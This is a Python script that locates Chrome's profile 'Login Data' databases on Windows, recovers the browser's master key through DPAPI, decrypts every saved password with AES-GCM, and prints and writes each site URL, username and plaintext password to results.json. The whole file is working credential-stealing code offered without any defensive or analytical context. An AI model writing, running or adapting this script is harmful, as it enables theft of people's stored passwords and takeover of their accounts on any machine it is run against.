import os
import json
import base64
import sqlite3
import win32crypt
import shutil
import re
from datetime import datetime, timedelta
from Crypto.Cipher import AES

def unix_to_date(unix):
	return datetime(1601, 1, 1) + timedelta(microseconds=unix)

def save_results(*args):

	result = {

		"url": args[0],
		"username": args[1],
		"password": args[2],
		"created_date": args[3],
		"last_used_date": args[4]

	}

	with open("results.json", "a") as f:
		json_obj = json.dumps(result, indent=4, default=str, separators=(',', ':'))
		f.write(json_obj+"\n")

def get_dbs() -> list:
	databases = []
	chrome_path = f'{os.getenv("localappdata")}\\Google\\Chrome\\User Data'

	try:
		dict_list = os.listdir(chrome_path)
	except FileNotFoundError:
		print(f"Chrome is not installed in this computer.")
		exit()

	databases = [f"{chrome_path}\\{i}\\Login Data" for i in dict_list if re.match(r"Profile [-+]?[0-9]+$", i)]
	
	if "Default" in dict_list:
		databases.append(f"{chrome_path}\\Default\\Login Data")

	return databases


def get_encryption_key():
	local_state_path = os.path.join(os.environ["USERPROFILE"],
									"AppData", "Local", "Google", "Chrome",
									"User Data", "Local State")
	with open(local_state_path, "r", encoding="utf-8") as f:
		local_state = f.read()
		local_state = json.loads(local_state)
	key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	key = key[5:]
	return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
	return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
	return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(password, master_key):
	try:
		iv = password[3:15]
		payload = password[15:]
		cipher = generate_cipher(master_key, iv)
		decrypted_pass = decrypt_payload(cipher, payload)
		decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
		return decrypted_pass
	except Exception as e:
		return "Probably this password is saved before v80 of chrome"
 

def main():
	dbs = get_dbs()
	key = get_encryption_key()
	if not dbs:
		print("Databases not found!")
		exit()

	for db in dbs:
		shutil.copy(db, "db") # creating a copy of the database, sometimes the db is being locked.
		conn = sqlite3.connect("db")
		cursor = conn.cursor()
		try:
			cursor.execute("SELECT action_url, username_value, password_value, date_created, date_last_used FROM logins")
			for r in cursor.fetchall():
				url = r[0]
				username = r[1]
				password = decrypt_password(r[2], key) # r[2] = encrypted_password, and we will decrypt it using the decrypt_password function
				created_date = unix_to_date(r[3])
				date_last_used = unix_to_date(r[4])
				if len(password) > 0:
					save_results(url, username, password, created_date, date_last_used)
					print(f"{'-'*50}\nWebsite-URL: {url}\nUsername: {username}\nPassword: {password}\nCreated Date: {created_date}\nLast Used Date: {date_last_used}")
		except Exception as e:
			print(e)
		cursor.close()
		conn.close()
		try:
			os.remove("db")
		except Exception as e:
			print(e)

if __name__ == '__main__':
	main()
